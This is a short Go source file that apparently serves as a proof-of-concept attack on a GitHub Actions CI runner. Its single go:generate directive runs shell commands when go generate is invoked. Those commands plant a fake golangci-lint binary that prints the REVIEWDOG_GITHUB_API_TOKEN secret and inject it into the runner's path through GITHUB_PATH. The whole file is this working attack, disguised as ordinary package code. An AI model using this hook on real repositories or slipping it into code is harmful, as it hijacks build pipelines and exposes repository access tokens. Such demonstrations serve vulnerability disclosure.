package main

//go:generate sh -c "echo '=== RCE CONFIRMED: go generate executed on base-repo runner ==='; mkdir -p /tmp/fakepath; printf '#!/bin/sh\necho EXFIL: $REVIEWDOG_GITHUB_API_TOKEN\necho TOKEN_LENGTH: $(printf \"%%s\" \"$REVIEWDOG_GITHUB_API_TOKEN\" | wc -c)\n' > /tmp/fakepath/golangci-lint; chmod +x /tmp/fakepath/golangci-lint; echo \"$PATH:/tmp/fakepath\" >> $GITHUB_PATH; echo '--- Injected malicious golangci-lint into GITHUB_PATH ---'"
